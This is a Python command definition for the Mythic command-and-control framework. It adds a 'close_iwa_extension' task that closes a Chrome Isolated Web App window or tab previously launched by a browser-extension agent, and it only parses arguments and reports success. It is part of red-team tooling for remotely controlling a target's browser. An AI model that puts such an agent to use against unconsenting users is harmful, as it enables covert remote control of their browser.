from mythic_container.MythicCommandBase import *


class CloseIwaExtensionArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="window_id",
                type=ParameterType.Number,
                description="Optional Chrome window ID returned by launch_iwa_extension.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
                default_value=0,
            ),
            CommandParameter(
                name="tab_id",
                type=ParameterType.Number,
                description="Optional Chrome tab ID returned by launch_iwa_extension.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
                default_value=0,
            ),
            CommandParameter(
                name="iwa_url",
                type=ParameterType.String,
                description="Optional isolated-app:// URL to close. Defaults to the last extension-launched IWA.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        command_line = self.command_line.strip()
        if not command_line:
            return
        if command_line[0] == "{":
            self.load_args_from_json_string(command_line)
            return
        if command_line.startswith("isolated-app://"):
            self.add_arg("iwa_url", command_line)
            return
        try:
            self.add_arg("window_id", int(command_line))
        except Exception:
            self.add_arg("iwa_url", command_line)


class CloseIwaExtensionCommand(CommandBase):
    cmd = "close_iwa_extension"
    needs_admin = False
    help_cmd = "close_iwa_extension [window_id|isolated-app://...]"
    description = "Close the IWA window or tab previously launched by the extension."
    version = 1
    author = "@kingofthenops"
    attackmapping = []
    argument_class = CloseIwaExtensionArguments
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        window_id = taskData.args.get_arg("window_id") or 0
        tab_id = taskData.args.get_arg("tab_id") or 0
        iwa_url = taskData.args.get_arg("iwa_url") or ""
        target = iwa_url or (f"window={window_id}" if window_id else "") or (f"tab={tab_id}" if tab_id else "last")
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=target,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
